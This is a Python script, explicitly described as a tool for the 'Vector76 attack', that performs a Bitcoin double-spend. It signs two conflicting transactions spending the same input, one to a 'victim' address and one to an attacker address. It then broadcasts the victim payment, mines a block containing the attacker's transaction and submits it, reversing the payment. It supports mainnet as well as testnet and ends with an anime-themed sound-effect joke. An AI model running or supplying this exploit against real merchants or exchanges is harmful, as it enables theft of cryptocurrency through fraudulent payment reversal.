import time

import bitcoin
import argparse
import subprocess
import bitcoin_tools.core.transaction

from bitcoincli import Bitcoin
from bitcoinaddress import Wallet
from bitcoin_tools.core.transaction import TX

parser = argparse.ArgumentParser(description="How To Use vector76")

parser.add_argument("node_host",
                    help="Blockchain Node Host",
                    type=str)
parser.add_argument("node_port",
                    help="Blockchain Node Port",
                    type=int)
parser.add_argument("username",
                    help="Node username",
                    type=str)
parser.add_argument("password",
                    help="Node password",
                    type=str)
parser.add_argument("attacker_signkey",
                    help="The attacker has the WIF format private key of the first address (this is used to sign the transaction)",
                    type=str)
parser.add_argument("victim_address",
                    help="victim address.",
                    type=str)
parser.add_argument("attacker_address",
                    help="Address held by attacker to receive refund (Please prepare an address that is different from the address that can be generated with the private key specified in the first place.)",
                    type=str)
parser.add_argument("amount_of_coins",
                    help="Amount of coins sent. (Enter in BTC units)",
                    type=float)
parser.add_argument("prev_deposit_TXID",
                    help="Last deposit TXID of first attacker address",
                    type=str)
parser.add_argument("--network",
                    help="mainnet or testnet. (Default = testnet)",
                    type=str,
                    default="testnet")

def to_satoshi(btc_amount):
    satoshi = 0.00000001
    return btc_amount / satoshi

args = parser.parse_args()
rpc_host = args.node_host
rpc_port = args.node_port
username = args.username
password = args.password
key      = args.attacker_signkey
victim_address   = args.victim_address
attacker_address = args.attacker_address
amount_BTC = args.amount_of_coins#float(sys.argv[9])
prev_txid  = args.prev_deposit_TXID
network = args.network

if (network != "mainnet") and (network != "testnet"):
    network = "testnet"

print(f"[+] {network} Mode.")
print("Connecting Node...")
rpc_node = Bitcoin(username, password, rpc_host, rpc_port)

info = rpc_node.getblockchaininfo()
print(info)
print("--------------------")
amount_satoshi = to_satoshi(amount_BTC)
print(amount_satoshi)
fee_satoshi = 1500

bitcoin.SelectParams(network)
print("Create T1 rawtx And sign")
tx_victim = TX.build_from_io(prev_txid, 0, amount_satoshi - fee_satoshi, victim_address).hex
print(tx_victim)
tx_victim = bitcoin.transaction.sign(tx_victim, key)
print()
print(tx_victim)

print("Create T2 rawtx And sign")
tx_attacker = TX.build_from_io(prev_txid, 0, amount_satoshi - fee_satoshi, attacker_address).hex
print(tx_attacker)
tx_attacker = bitcoin.transaction.sign(tx_attacker, key)

print()
print(tx_attacker)
print("[+] READY...")
print(f"Network : {network}")
print(f"Send Amount (Satoshi) : {amount_satoshi - fee_satoshi}")
print(f"Mining Fee  (Satoshi) : {fee_satoshi}")
print(f"Victim   Address      : {victim_address}")
print(f"Attacker Address      : {attacker_address}")
input(" --- Press the enter key to continue the Vector76 attack. --- ")
print("push T1")
result = rpc_node.sendrawtransaction(tx_victim)
print(result)
print("T1 Pushed.")
print("push T2")
result = rpc_node.sendrawtransaction(tx_attacker)
print(result)
print("Mining Vector76 Block...")
miner_Wallet = Wallet()
print(" --- Miner Wallet --- ")
print(attacker_address)
print(" -------------------- ")
vector76_mining_hash = rpc_node.generateblock(f"{attacker_address} [{tx_attacker}]")
print()
print(vector76_mining_hash)
input("--- Send the block after pressing the enter key. --- ")
print()
print(f"submitblock {vector76_mining_hash}")
print()
result = rpc_node.submitblock(vector76_mining_hash)
try:
    result = rpc_node.sendrawtransaction(tx_attacker) #念の為
    print(result)
except:
    print("")
print()#おまけ
print(f"Kamijou Touma >> Kill that blockchain transaction!!")
print()

sound_name = "ImagineBreaker.mp3"
try:
    import mp3play
    clip = mp3play.load(sound_name)
    clip.play()
    time.sleep(min(5, clip.seconds()))
    clip.stop()
except:
    # Termux Only
    imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
    subprocess.run(imagine_breaker_cmd)
print("Done.")
